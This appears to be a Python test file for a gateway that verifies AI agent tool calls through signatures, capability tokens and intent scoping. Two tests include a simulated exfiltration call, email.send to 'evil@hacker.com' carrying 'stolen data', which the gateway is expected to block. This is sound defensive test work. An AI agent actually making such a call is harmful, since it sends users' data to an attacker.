"""Tests for gateway service — full PACT pipeline."""

import asyncio
import pytest
from datetime import datetime, timezone
from unittest.mock import patch, MagicMock

from app.services.gateway import GatewayService
from app.services.passport import PassportService
from app.services.intent import IntentService
from app.services.capability import CapabilityService
from app.services.envelope import EnvelopeService
from app.services.provenance import ProvenanceService
from app.services.policy import PolicyService
from app.services.ledger import LedgerService
from app.schemas import Decision
from app.crypto import generate_keypair
from app.database import async_session


@pytest.fixture
def issuer_keys():
    return generate_keypair()


@pytest.fixture
def agent_keys():
    return generate_keypair()


@pytest.fixture
def services(issuer_keys):
    """Create all PACT services with shared issuer keys."""
    issuer_priv, issuer_pub = issuer_keys
    return {
        "passport": PassportService(issuer_priv, issuer_pub),
        "intent": IntentService(),
        "capability": CapabilityService(issuer_priv, issuer_pub),
        "envelope": EnvelopeService(),
        "provenance": ProvenanceService(),
        "policy": PolicyService(),
        "ledger": LedgerService(),
    }


@pytest.fixture
def gateway(services):
    return GatewayService(
        passport_service=services["passport"],
        intent_service=services["intent"],
        capability_service=services["capability"],
        envelope_service=services["envelope"],
        provenance_service=services["provenance"],
        policy_service=services["policy"],
        ledger_service=services["ledger"],
    )


async def _setup_agent_and_intent(services, agent_keys, agent_id="agent_gw_1"):
    """Register an agent and create an intent. Returns (agent_private_key, intent_hash)."""
    agent_priv, agent_pub = agent_keys
    async with async_session() as db:
        result = await services["passport"].create_passport(
            db=db,
            agent_id=agent_id,
            owner="test-owner",
            agent_type="assistant",
            allowed_domains=["example.com"],
            risk_tier="medium",
        )
        agent_private_key = result["agent_private_key"]

        intent = await services["intent"].create_intent(
            db=db,
            user_goal="summarize my emails",
        )
        intent_hash = intent["intent_hash"]

    return agent_private_key, intent_hash


async def test_valid_envelope_executes(gateway, services, agent_keys, setup_db):
    """Full pipeline: register, intent, token, envelope → ALLOW."""
    agent_priv, _ = agent_keys
    agent_private_key, intent_hash = await _setup_agent_and_intent(services, agent_keys)

    async with async_session() as db:
        # Issue capability token for email.read (allowed by "summarize emails" intent)
        token = await services["capability"].issue_token(
            db=db,
            agent_id="agent_gw_1",
            intent_hash=intent_hash,
            capability="email.read",
            resource="msg_1",
        )

        # Create envelope
        provenance = {
            "influenced_by": ["trusted.user"],
            "uses_data": [],
            "side_effect": None,
        }
        envelope = services["envelope"].create_envelope(
            agent_id="agent_gw_1",
            agent_private_key=agent_private_key,
            run_id="run_gw_001",
            step_id=0,
            tool="email.read",
            args={"email_id": "msg_1"},
            intent_hash=intent_hash,
            capability_token_hash=token["token_hash"],
            provenance=provenance,
        )

        response = await gateway.execute(db, envelope, "run_gw_001")

    assert response.decision == Decision.ALLOW
    assert response.action_hash is not None
    assert response.risk_score < 100


async def test_invalid_signature_blocked(gateway, services, agent_keys, setup_db):
    """An envelope with a tampered signature is BLOCKED."""
    agent_private_key, intent_hash = await _setup_agent_and_intent(services, agent_keys)

    async with async_session() as db:
        token = await services["capability"].issue_token(
            db=db,
            agent_id="agent_gw_1",
            intent_hash=intent_hash,
            capability="email.read",
            resource="inbox",
        )

        provenance = {
            "influenced_by": ["trusted.user"],
            "uses_data": [],
            "side_effect": None,
        }
        envelope = services["envelope"].create_envelope(
            agent_id="agent_gw_1",
            agent_private_key=agent_private_key,
            run_id="run_gw_002",
            step_id=0,
            tool="email.read",
            args={"email_id": "msg_1"},
            intent_hash=intent_hash,
            capability_token_hash=token["token_hash"],
            provenance=provenance,
        )

        # Tamper with the signature
        envelope["agent_signature"] = "AAAA_INVALID_SIGNATURE_BASE64"

        response = await gateway.execute(db, envelope, "run_gw_002")

    assert response.decision == Decision.BLOCK
    assert any("signature" in r.lower() for r in response.reasons)


async def test_expired_token_blocked(gateway, services, agent_keys, setup_db):
    """An envelope with an expired capability token is BLOCKED."""
    agent_private_key, intent_hash = await _setup_agent_and_intent(services, agent_keys)

    async with async_session() as db:
        # Issue with ttl=0 → immediately expired
        token = await services["capability"].issue_token(
            db=db,
            agent_id="agent_gw_1",
            intent_hash=intent_hash,
            capability="email.read",
            resource="inbox",
            ttl_seconds=0,
        )

        await asyncio.sleep(0.05)

        provenance = {
            "influenced_by": ["trusted.user"],
            "uses_data": [],
            "side_effect": None,
        }
        envelope = services["envelope"].create_envelope(
            agent_id="agent_gw_1",
            agent_private_key=agent_private_key,
            run_id="run_gw_003",
            step_id=0,
            tool="email.read",
            args={"email_id": "msg_1"},
            intent_hash=intent_hash,
            capability_token_hash=token["token_hash"],
            provenance=provenance,
        )

        response = await gateway.execute(db, envelope, "run_gw_003")

    assert response.decision == Decision.BLOCK


async def test_tool_outside_intent_blocked(gateway, services, agent_keys, setup_db):
    """Using a tool not in the intent's allowed_actions is BLOCKED."""
    agent_private_key, intent_hash = await _setup_agent_and_intent(services, agent_keys)

    async with async_session() as db:
        # Issue a token for email.send, but the "summarize emails" intent
        # only allows email.read, summarize, respond_to_user — not email.send
        token = await services["capability"].issue_token(
            db=db,
            agent_id="agent_gw_1",
            intent_hash=intent_hash,
            capability="email.send",
            resource="outbox",
        )

        provenance = {
            "influenced_by": ["trusted.user"],
            "uses_data": [],
            "side_effect": "external_write",
        }
        envelope = services["envelope"].create_envelope(
            agent_id="agent_gw_1",
            agent_private_key=agent_private_key,
            run_id="run_gw_004",
            step_id=0,
            tool="email.send",
            args={"to": "evil@hacker.com", "body": "stolen data"},
            intent_hash=intent_hash,
            capability_token_hash=token["token_hash"],
            provenance=provenance,
        )

        response = await gateway.execute(db, envelope, "run_gw_004")

    assert response.decision == Decision.BLOCK
    assert any("not allowed" in r.lower() or "intent" in r.lower() for r in response.reasons)


async def test_blocked_action_does_not_execute_tool(gateway, services, agent_keys, setup_db):
    """A blocked action must not execute the underlying tool."""
    agent_private_key, intent_hash = await _setup_agent_and_intent(services, agent_keys)

    async with async_session() as db:
        token = await services["capability"].issue_token(
            db=db,
            agent_id="agent_gw_1",
            intent_hash=intent_hash,
            capability="email.send",
            resource="outbox",
        )

        provenance = {
            "influenced_by": ["trusted.user"],
            "uses_data": [],
            "side_effect": "external_write",
        }
        envelope = services["envelope"].create_envelope(
            agent_id="agent_gw_1",
            agent_private_key=agent_private_key,
            run_id="run_gw_block_no_exec",
            step_id=0,
            tool="email.send",
            args={"to": "evil@hacker.com", "body": "stolen"},
            intent_hash=intent_hash,
            capability_token_hash=token["token_hash"],
            provenance=provenance,
        )

        # Patch get_mock_tool at its usage site to return a MagicMock
        mock_tool_fn = MagicMock(return_value={"status": "sent"})
        with patch("app.services.gateway.get_mock_tool", return_value=mock_tool_fn):
            response = await gateway.execute(db, envelope, "run_gw_block_no_exec")
            mock_tool_fn.assert_not_called()

    assert response.decision == Decision.BLOCK
